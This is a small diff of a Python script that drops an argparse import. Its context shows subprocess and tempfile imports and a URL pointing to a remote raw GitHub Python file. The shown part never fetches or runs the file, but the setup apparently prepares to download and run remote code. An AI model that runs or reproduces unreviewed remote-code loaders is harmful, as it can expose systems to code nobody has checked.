@@ -3,7 +3,6 @@ import subprocess
 import os
 import sys
 import tempfile
-import argparse
 
 args = sys.argv[1:]
 url = "https://raw.githubusercontent.com/Raphi9999/Test/refs/heads/main/githubtest.py"
